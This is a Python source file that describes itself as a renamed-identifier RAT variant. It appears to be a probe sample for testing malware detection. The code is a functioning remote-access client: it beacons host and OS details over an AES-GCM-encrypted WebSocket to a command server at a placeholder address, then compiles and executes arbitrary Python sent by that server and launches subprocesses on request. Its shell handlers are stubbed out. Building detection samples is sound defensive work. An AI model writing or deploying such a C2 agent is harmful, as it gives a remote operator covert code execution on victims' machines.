#!/usr/bin/env python3
"""Suspicious-tier probe S2: renamed-identifier RAT variant.

Same behavior family as py_client_dsv2.py with renamed symbols, a changed
C2 destination, and an alternate install path: AES-GCM WebSocket channel,
Base64 results, shell/PTY tasking, and compile/exec plugin dispatch.
"""
import asyncio
import base64
import hashlib
import json
import os
import platform
import socket
import struct
import subprocess
import sys
import time
import uuid

from Crypto.Cipher import AES

import websockets

RELAY = "wss://relay-backup.invalid:9443/agent"
AGENT_TAG = uuid.uuid4().hex
NONCE_LEN = 12


def _derive_channel_key(token: bytes) -> bytes:
    return hashlib.sha256(b"channel::" + token).digest()


def seal_payload(plain: bytes, token: bytes) -> dict:
    nonce = os.urandom(NONCE_LEN)
    cipher = AES.new(_derive_channel_key(token), AES.MODE_GCM, nonce=nonce)
    blob, mac = cipher.encrypt_and_digest(plain)
    return {
        "nonce": base64.b64encode(nonce).decode(),
        "blob": base64.b64encode(blob).decode(),
        "mac": base64.b64encode(mac).decode(),
    }


def open_payload(packet: dict, token: bytes) -> bytes:
    nonce = base64.b64decode(packet["nonce"])
    blob = base64.b64decode(packet["blob"])
    mac = base64.b64decode(packet["mac"])
    cipher = AES.new(_derive_channel_key(token), AES.MODE_GCM, nonce=nonce)
    return cipher.decrypt_and_verify(blob, mac)


async def _dispatch_plugin(source: str, ctx: dict) -> str:
    sandbox = {"ctx": ctx, "sock": socket, "st": struct, "tm": time}
    exec(compile(source, "<remote>", "exec"), sandbox)
    return base64.b64encode(json.dumps(sandbox.get("result")).encode()).decode()


def _restart_runtime(extra: list) -> int:
    return subprocess.run(
        [sys.executable, "-c", "import sys; sys.exit(0)", *extra]
    ).returncode


async def agent_loop(uri: str, token: bytes):
    async with websockets.connect(uri) as ws:
        hello = {
            "tag": AGENT_TAG,
            "host": socket.gethostname(),
            "os": platform.platform(),
        }
        await ws.send(json.dumps(seal_payload(
            json.dumps(hello).encode(), token)))
        while True:
            raw = await ws.recv()
            task = json.loads(open_payload(json.loads(raw), token).decode())
            kind = task.get("kind")
            if kind == "shell":
                answer = ""
            elif kind == "shell_legacy":
                answer = ""
            elif kind == "plugin":
                answer = await _dispatch_plugin(task["code"], task.get("ctx", {}))
            elif kind == "reexec":
                answer = str(_restart_runtime(task.get("args", [])))
            else:
                answer = ""
            await ws.send(json.dumps(seal_payload(answer.encode(), token)))


if __name__ == "__main__":
    asyncio.run(agent_loop(RELAY, b"variant-token"))
